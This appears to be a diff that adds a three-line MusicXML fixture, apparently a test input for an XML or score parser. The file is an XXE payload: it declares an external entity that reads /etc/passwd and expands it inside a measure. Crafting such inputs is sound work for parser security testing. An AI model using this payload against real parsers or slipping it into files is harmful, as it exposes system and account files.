@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE score-partwise [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<score-partwise version="4.0"><part-list/><part id="P1"><measure number="1">&xxe;</measure></part></score-partwise>
